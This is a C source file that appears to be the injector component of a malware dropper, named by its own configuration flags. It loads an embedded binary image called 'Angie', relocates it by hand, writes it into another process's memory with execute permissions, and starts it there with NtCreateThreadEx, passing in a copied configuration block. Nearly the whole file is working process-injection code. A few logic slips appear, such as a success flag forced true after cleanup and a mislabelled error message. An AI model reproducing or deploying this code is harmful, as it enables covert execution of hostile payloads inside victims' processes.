#include <angie.h>
#include <config.h>
#include <ntapi.h>

#define MODULE_EXPORT(NAME, RVA) RVA, 

#ifdef __INTELLISENSE__
    #define MODULE_BASERELOC  0
    #define MODULE_IMAGE      0
    #define MODULE_IMAGE_SIZE 0
#endif
    
DWORD AngieImageExportAddress[] = {
    #ifdef _AMD64_
        #include "bin\image64.h"
    #else
        #include "bin\image32.h"
    #endif
};

BYTE  AngieImageReloc[] = { MODULE_BASERELOC };
BYTE  AngieImage[]      = { MODULE_IMAGE     };
PVOID AngieImageBase    = NULL;

enum {
    AngieImageSize = MODULE_IMAGE_SIZE,
};

#undef MODULE_BASERELOC
#undef MODULE_IMAGE
#undef MODULE_IMAGE_SIZE

#if defined(_AMD64_) || SCFG_CORE_DROPPER_FORCE_X86 == ON
    static
    BOOL
    IsProcessWow64(
        IN  PCLIENT_ID Pid,
        OUT PULONG_PTR dwIsWow64
        )
    {
        HANDLE hProcess;
        BOOL   bRval = FALSE;
        OBJECT_ATTRIBUTES NullObject = {
            sizeof(OBJECT_ATTRIBUTES),
            NULL
        };
        
        if (!NT_ERROR(NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &NullObject, Pid))) {
            ULONG dwWantedSize = 0;

            if (!NT_ERROR(NtQueryInformationProcess(hProcess, ProcessWow64Information, dwIsWow64, sizeof(*dwIsWow64), &dwWantedSize) || dwWantedSize != sizeof(ULONG_PTR))) {
                bRval = TRUE;
            }

            NtClose(hProcess);
        }

        return bRval;
    }
#endif

static
VOID
SetAngieBaseAddress(
    IN PVOID NewBase
    )
{
    $DLOG1(DLG_FLT_DEFAULT, "Relocating angie to addreess: %p", NewBase);

    PIMAGE_BASE_RELOCATION BaseReloc = (PVOID)AngieImageReloc;

    while (BaseReloc->SizeOfBlock) {
        $DLOG3(DLG_FLT_DEFAULT,  "% 8lX RVA % 8lX SizeOfBlock", BaseReloc->VirtualAddress, BaseReloc->SizeOfBlock);

        PWORD dwRelocArray = (PVOID)((ULONG_PTR)BaseReloc + sizeof(IMAGE_BASE_RELOCATION));
        ULONG NumberOfWords = (BaseReloc->SizeOfBlock  - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (ULONG i = 0; i != NumberOfWords; i++) {
            DWORD dwRelocRva  = dwRelocArray[i] & 0xFFF;
            DWORD dwRelocType = dwRelocArray[i] >> 12;

            if (dwRelocType == IMAGE_REL_BASED_ABSOLUTE) {
                continue;
            }

            PULONG_PTR dwPointer = (PVOID)((ULONG_PTR)AngieImage + BaseReloc->VirtualAddress + dwRelocRva);

            #ifdef _AMD64_
                $DLOG3(DLG_FLT_DEFAULT, "\t% 8X %X %016I64X -> %016I64X", dwRelocRva, dwRelocType, *dwPointer, *dwPointer - (ULONG_PTR)AngieImageBase + (ULONG_PTR)NewBase);
            #else
                $DLOG3(DLG_FLT_DEFAULT, "\t% 8X %X %08lX -> %08lX", dwRelocRva, dwRelocType, *dwPointer, *dwPointer - (ULONG_PTR)AngieImageBase + (ULONG_PTR)NewBase);
            #endif

            *dwPointer -= (ULONG_PTR)AngieImageBase;
            *dwPointer += (ULONG_PTR)NewBase;
        }

        ((ULONG_PTR)BaseReloc) += (NumberOfWords * 2) + sizeof(IMAGE_BASE_RELOCATION);
    }

    AngieImageBase = NewBase;
}

#ifdef DEBUG
    BOOL
    InjectAngieToProcess(
        IN ULONG dwPid,
        IN PWSTR szImageName
        )
#else
    BOOL
    InjectAngieToProcess(
        IN ULONG dwPid
        )
#endif
{
    CLIENT_ID Pid = {
        dwPid,
        0
    };

    #if defined(_AMD64_) || SCFG_CORE_DROPPER_FORCE_X86 == ON
        ULONG_PTR bIsWow64;

        if (!IsProcessWow64(&Pid, &bIsWow64)) {
            $DLOG1(DLG_FLT_ERROR, "Can't open PID:%lu Image:%ls", dwPid, szImageName);

            return FALSE;
        }

        #ifdef _AMD64_
            if (bIsWow64) {
                $DLOG3(DLG_FLT_WARNING, "Skipping WOW64 process PID:%lu Image:%ls", dwPid, szImageName);

                return FALSE;
            }
        #else
            if (!bIsWow64) {
                $DLOG3(DLG_FLT_WARNING, "Skipping x64 process PID:%lu Image:%ls", dwPid, szImageName);

                return FALSE;
            }
        #endif
        
    #endif

    $DLOG1(DLG_FLT_INFO, "Injecting to PID:%lu Image:%ls", dwPid, szImageName);

    HANDLE hProcess;
    BOOL bRval = FALSE;
    OBJECT_ATTRIBUTES NullObject = {
        sizeof(OBJECT_ATTRIBUTES),
        NULL
    };

    if (!NT_ERROR(NtOpenProcess(&hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, &NullObject, &Pid))) {
        PVOID HostCave = NULL;
        SIZE_T cbHostCave = AngieImageSize;

        if (!NT_ERROR(NtAllocateVirtualMemory(hProcess, &HostCave, 0, &cbHostCave, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
            ULONG cbBytesWritten = 0;

            $DLOG2(DLG_FLT_DEFAULT, "cave: %p", HostCave);

            SetAngieBaseAddress(HostCave);

            #if SCFG_DROPPER_ANGIE_PRETEND_TO_INJECT == OFF
                if (!NT_ERROR(NtWriteVirtualMemory(hProcess, HostCave, AngieImage, AngieImageSize, &cbBytesWritten))) {
                    if (NT_ERROR(NtFlushInstructionCache(hProcess, HostCave, (ULONG)cbHostCave))) {
                        $DLOG1(DLG_FLT_WARNING, "Couldn't flush instruction cache");
                    }

                    HANDLE hThread;

                    if (!NT_ERROR(NtCreateThreadEx(&hThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, hProcess, (PVOID)((ULONG_PTR)HostCave + AngieImageExportAddress[0]), NULL, 0, 0, PAGE_SIZE, PAGE_SIZE, NULL))) {
                        $DLOG1(DLG_FLT_DEFAULT, "Angie external thread started");
                        bRval = TRUE;
                    } else {
                        $DLOG1(DLG_FLT_ERROR, "Failed to continue entry on different thread");
                    }
                } else {
                    $DLOG1(DLG_FLT_ERROR, "Failed to free host cave");
                }
            #endif

            if (!bRval) {
                cbHostCave = 0;

                if (NT_ERROR(NtFreeVirtualMemory(hProcess, &HostCave, &cbHostCave, MEM_RELEASE))) {
                    $DLOG1(DLG_FLT_ERROR, "Failed to free host cave");
                }
            }
        } else {
            $DLOG1(DLG_FLT_ERROR, "Can't allocate %lu bytes", AngieImageSize);
        }

        NtClose(hProcess);
        bRval = TRUE;

        $DLOG2(DLG_FLT_INFO, "Done");
    } else {
        $DLOG1(DLG_FLT_ERROR, "Can't open PID:%lu Image:%ls", dwPid, szImageName);
    }

    return bRval;
}

VOID
InitAngieImage(VOID)
{
    $DLOG1(DLG_FLT_INFO, "Initializing Angie image");

    RtlpCopyMemoryInline((PVOID)((ULONG_PTR)AngieImage + AngieImageExportAddress[1]), &Config, sizeof(Config));

    $DLOG2(DLG_FLT_INFO, "Done");
}
